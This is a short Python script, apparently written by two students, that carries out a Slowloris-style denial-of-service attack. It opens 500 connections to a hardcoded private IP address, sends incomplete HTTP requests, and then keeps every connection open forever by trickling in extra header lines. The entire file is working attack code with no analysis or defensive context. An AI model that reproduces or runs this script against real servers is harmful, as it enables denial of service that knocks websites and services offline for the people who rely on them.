#Henrique Haji
#Thauany Moedano

import socket, random, time, sys

#Header HTTP usado para enviar a mensagem
headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
]

sockets = []

#Monta um socket HTTP 
def setupSocket(ip, porta):
    requestHTTP = "GET /?{} HTTP/1.1\r\n" 
    carryOver = "{}\r\n"

    meiaSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    meiaSocket.connect((ip, porta))
    meiaSocket.send(requestHTTP.format(random.randint(0, 1337)).encode("utf-8"))

    for header in headers:
        meiaSocket.send(carryOver.format(header).encode("utf-8"))

    return meiaSocket

if __name__ == "__main__":
    ip = "172.21.209.71"
    porta = 2000
    count = 500

	#cria 500 conexões HTTP 
    for _ in range(count):
        meiaSocket = setupSocket(ip, porta)
        sockets.append(meiaSocket)

	#Envia a mensagem 
    while True:
        for meiaSocket in list(sockets):
            meiaSocket.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))

        